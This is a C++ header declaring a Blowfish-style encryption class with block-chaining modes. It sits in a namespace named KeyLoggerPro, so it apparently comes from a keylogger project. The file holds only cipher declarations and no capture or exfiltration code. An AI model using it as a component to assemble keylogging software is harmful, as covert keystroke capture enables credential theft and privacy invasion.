/**
 * Encryption.h
 *
 * @author Raul Butuc
 * @version 1.0.1 - 29/07/2016
 */

#pragma once

#include "stdafx.h"

namespace KeyLoggerPro {

  struct Block {
    unsigned int m_uil, m_uir;

    Block(unsigned int, unsigned int);
    Block(const Block&);
    Block& operator^=(Block&);
  };

  class Encryption {

    private:
      Block m_oChain0;
      Block m_oChain;
      unsigned int m_auiP[18];
      unsigned int m_auiS[4][256];
      static const unsigned int scm_auiInitP[18];
      static const unsigned int scm_auiInitS[4][256];

      unsigned int F(unsigned int);
      void encrypt(Block&);
      void decrypt(Block&);

    public:
      enum { ECB = 0, CBC = 1, CFB = 2 };

      Encryption(unsigned char*, size_t, const Block&);

      void resetChain();
      void encrypt(unsigned char*, size_t, int);
      void encrypt(const unsigned char*, unsigned char*, size_t, int);
      void decrypt(unsigned char*, size_t, int);
      void decrypt(const unsigned char*, unsigned char*, size_t, int);

  };

  inline unsigned char Byte(unsigned int _ui) {
    return static_cast<unsigned char>(_ui & 0xFF);
  }

  inline unsigned int Encryption::F(unsigned int _ui) {
    return ((m_auiS[0][Byte(_ui>>24)] + m_auiS[1][Byte(_ui>>16)]) ^ m_auiS[2][Byte(_ui >> 8)]) + m_auiS[3][Byte(_ui)];
  }

}
